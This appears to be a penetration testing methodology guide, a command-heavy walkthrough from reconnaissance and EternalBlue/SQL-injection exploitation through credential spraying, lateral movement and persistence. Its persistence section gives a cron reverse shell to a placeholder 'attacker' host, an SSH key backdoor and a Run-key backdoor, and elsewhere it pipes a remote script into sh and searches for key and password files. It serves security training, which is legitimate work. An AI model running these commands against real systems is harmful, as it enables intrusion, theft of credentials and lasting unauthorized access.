# Network Security Attack Methodology Guide

## Complete Penetration Testing Workflow

This document outlines a comprehensive methodology for network security testing, covering when to use which tools and techniques.

---

## Phase 1: Information Gathering (Reconnaissance)

### Passive Reconnaissance
**Objective**: Gather information without touching the target
**Tools**: OSINT, search engines, public databases
**Duration**: 1-3 days

```bash
# Domain Information
whois target.com
dig target.com ANY
amass enum -passive -d target.com
sublist3r -d target.com

# Public Data
# Google Dorking: site:target.com
# Shodan: org:"Target Company"
# Certificate Transparency: crt.sh
# GitHub: search for "target.com"
```

**When to Use**:
- Initial assessment
- External pentest
- No direct contact allowed yet
- Gathering attack surface

### Active Reconnaissance
**Objective**: Direct interaction to enumerate targets
**Tools**: Nmap, Masscan, Netdiscover
**Duration**: Hours to days depending on scope

```bash
# Network Discovery
nmap -sn 192.168.1.0/24           # Ping sweep
arp-scan -l                       # ARP scan (local)
netdiscover -r 192.168.1.0/24    # Passive/active discovery

# Port Scanning (Choose based on scope)
# Quick (100 ports): nmap -F target
# Standard (1000 ports): nmap target
# Comprehensive (65535 ports): nmap -p- target
# Fast comprehensive: masscan target -p1-65535 --rate 10000

# Service Enumeration
nmap -sV -p <ports> target        # Version detection
nmap -A target                    # Aggressive (OS, version, scripts, traceroute)

# Vulnerability Scanning
nmap --script vuln target         # Vulnerability scripts
```

**When to Use**:
- Authorized testing phase
- Need detailed port/service info
- Vulnerability assessment
- Network mapping

---

## Phase 2: Scanning and Enumeration

### Decision Tree: Which Scanner to Use?

**Use Nmap When**:
- Detailed service version needed
- NSE scripts required
- OS fingerprinting needed
- Small to medium networks (< 10k hosts)
- Stealth/evasion required

**Use Masscan When**:
- Large networks (10k+ hosts)
- Speed is priority
- Initial port discovery only
- Internet-wide scanning

**Use Netdiscover When**:
- Local network discovery
- Layer 2 enumeration
- Passive monitoring
- Hosts don't respond to ping

### Port-by-Port Enumeration Strategy

**Critical Ports Priority List**:
1. **Port 22 (SSH)** - Remote access
2. **Port 445 (SMB)** - File sharing, often vulnerable
3. **Port 80/443 (HTTP/HTTPS)** - Web services
4. **Port 3389 (RDP)** - Windows remote desktop
5. **Port 21 (FTP)** - File transfer
6. **Port 23 (Telnet)** - Unencrypted access
7. **Port 25 (SMTP)** - Email server
8. **Port 53 (DNS)** - Zone transfer, tunneling
9. **Port 3306 (MySQL)** - Database
10. **Port 1433 (MSSQL)** - Database

**Enumeration Commands per Port**:

```bash
# Port 21 - FTP
nmap -p 21 --script=ftp-* target
ftp target  # Try anonymous:anonymous

# Port 22 - SSH
nmap -p 22 --script=ssh-* target
ssh-keyscan target

# Port 25 - SMTP
nmap -p 25 --script=smtp-* target
smtp-user-enum -M VRFY -U users.txt -t target

# Port 53 - DNS
dig @target domain.com ANY
fierce --domain domain.com
nmap -p 53 --script=dns-* target

# Port 80/443 - HTTP/HTTPS
nmap -p 80,443 --script=http-* target
gobuster dir -u http://target -w wordlist.txt
nikto -h http://target

# Port 139/445 - SMB
nmap -p 445 --script=smb-* target
enum4linux -a target
smbclient -L //target -N

# Port 3306 - MySQL
nmap -p 3306 --script=mysql-* target
mysql -h target -u root -p

# Port 3389 - RDP
nmap -p 3389 --script=rdp-* target
```

---

## Phase 3: Vulnerability Assessment

### Automated Vulnerability Scanning

```bash
# Nmap NSE Vuln Scripts
nmap --script=vuln target -oA vuln_scan

# OpenVAS (Comprehensive)
# GUI-based scanner

# Nessus (Commercial)
# Professional scanner
```

### Manual Vulnerability Testing

**By Service**:
```bash
# FTP - Anonymous, bounce, backdoors
nmap --script=ftp-anon,ftp-bounce,ftp-vsftpd-backdoor target

# SSH - User enum, weak keys
# Check CVE-2018-15473 if OpenSSH < 7.7

# SMB - EternalBlue, SMB signing
nmap --script=smb-vuln-ms17-010 target

# Web - SQL injection, XSS, directory traversal
nikto, burpsuite, sqlmap, etc.
```

---

## Phase 4: Exploitation

### Decision Tree: Attack Path Selection

**1. If Unencrypted Protocol Found (Telnet, FTP, HTTP)**:
→ Credential sniffing via MITM
→ Brute force
→ Default credentials

**2. If Encrypted Protocol Found (SSH, HTTPS, RDP)**:
→ Brute force (if weak policy)
→ Known vulnerabilities
→ Certificate/key attacks

**3. If Vulnerable Service Found**:
→ Search Exploit-DB
→ Metasploit modules
→ Manual exploitation

### Exploitation Tools Selection

| Scenario | Best Tool | Alternative |
|----------|-----------|-------------|
| Known CVE | Metasploit | Manual exploit |
| Web vuln | Burp Suite | OWASP ZAP |
| Password crack | Hydra | Medusa, Ncrack |
| Hash crack | Hashcat | John the Ripper |
| MITM | Bettercap | Ettercap |
| WiFi crack | Aircrack-ng | Wifite |
| Privilege escalation | LinPEAS/WinPEAS | Manual enum |

### Common Attack Workflows

**Workflow 1: Weak Password Exploitation**
```bash
# 1. Find service
nmap -p 22,21,3389 target

# 2. Try default credentials
ssh admin@target  # admin:admin

# 3. Brute force if needed
hydra -l admin -P rockyou.txt ssh://target

# 4. Access system
ssh admin@target

# 5. Escalate privileges
sudo -l
# Exploit sudo misconfigurations
```

**Workflow 2: SMB Exploitation (EternalBlue)**
```bash
# 1. Detect SMB
nmap -p 445 --script=smb-os-discovery target

# 2. Check vulnerability
nmap --script=smb-vuln-ms17-010 target

# 3. Exploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST target
exploit

# 4. Post-exploitation
getuid
hashdump
```

**Workflow 3: Web Application Attack**
```bash
# 1. Discover web app
nmap -p 80,443 target
gobuster dir -u http://target -w wordlist.txt

# 2. Identify technologies
whatweb http://target
wappalyzer browser extension

# 3. Find vulnerabilities
nikto -h http://target
# Manual testing with Burp Suite

# 4. Exploit (example: SQL injection)
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D database --tables
sqlmap -u "http://target/page?id=1" -D database -T users --dump

# 5. Webshell upload if possible
# Upload PHP shell to writable directory
```

---

## Phase 5: Post-Exploitation

### Information Gathering After Access

```bash
# System enumeration
whoami
hostname
uname -a # Linux
systeminfo # Windows

# Network enumeration
ifconfig / ipconfig
netstat -ano
arp -a

# User enumeration
cat /etc/passwd # Linux
net user # Windows

# Find sensitive files
find / -name "*.conf" 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
```

### Privilege Escalation

**Linux**:
```bash
# Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l  # Sudo permissions
find / -perm -4000 -type f 2>/dev/null  # SUID binaries
crontab -l  # Cron jobs
cat /etc/crontab
```

**Windows**:
```bash
# Automated
.\winPEAS.exe

# Manual
whoami /priv
net user
net localgroup administrators
```

### Lateral Movement

```bash
# Find other hosts
ping -c 1 192.168.1.1-254
arp -a
cat ~/.ssh/known_hosts

# Try credentials on other systems
crackmapexec smb 192.168.1.0/24 -u admin -p password
crackmapexec ssh 192.168.1.0/24 -u admin -p password

# Pivot through compromised host
ssh -D 1080 user@compromised_host
proxychains nmap -sT 10.0.0.0/24
```

### Persistence

```bash
# Linux
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
(crontab -l; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker/443 0>&1'") | crontab -

# Windows
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

---

## Phase 6: Reporting

### What to Document

1. **Executive Summary** - Non-technical overview
2. **Methodology** - What was tested and how
3. **Findings** - Vulnerabilities discovered
4. **Evidence** - Screenshots, command output
5. **Risk Rating** - Critical, High, Medium, Low
6. **Recommendations** - How to fix issues
7. **Appendices** - Detailed technical data

### Evidence Collection

```bash
# Save all command output
script -a pentest_log.txt

# Screenshot all important findings
# Use tools: scrot, import, Windows Snipping Tool

# Save scan results
nmap -oA full_scan target

# Export packet captures
tcpdump -w evidence.pcap
```

---

## Tool Selection Matrix

| Task | Fast | Stealthy | Comprehensive | Easy |
|------|------|----------|---------------|------|
| Port Scan | Masscan | Nmap -T0 | Nmap -p- | Nmap |
| Service Enum | Nmap -sV | Nmap -T2 -sV | Nmap -A | Nmap -A |
| Brute Force | Hydra | Hydra -t 1 | Medusa | Hydra |
| MITM | Bettercap | Manual ARP | Ettercap | Bettercap |
| WiFi Crack | Wifite | Aircrack-ng | Aircrack-ng | Wifite |
| Web Scan | Nikto | Manual | Burp Pro | OWASP ZAP |

---

## Common Pitfalls to Avoid

1. **Scanning too aggressively** → Detection/blocking
2. **Not documenting** → Can't write report
3. **Assuming closed = secure** → Filtered ports need investigation
4. **Ignoring false positives** → Verify all findings
5. **Not cleaning up** → Leaving backdoors/evidence
6. **Scope creep** → Test only authorized targets
7. **No permission** → Illegal activity

---

## Quick Reference: When to Use What

**Reconnaissance**: Passive (OSINT) → Active (Nmap)
**Scanning**: Quick (nmap -F) → Full (nmap -p-)
**Enumeration**: Auto (NSE scripts) → Manual (service-specific)
**Exploitation**: Metasploit → Custom exploits
**Brute Force**: Hydra → Medusa → Ncrack
**MITM**: Bettercap → Ettercap
**Post-Exploit**: LinPEAS/WinPEAS → Manual
**Persistence**: SSH keys → Backdoors → Scheduled tasks
**Reporting**: Detailed → Executive summary

Remember: **Always get written authorization before testing!**
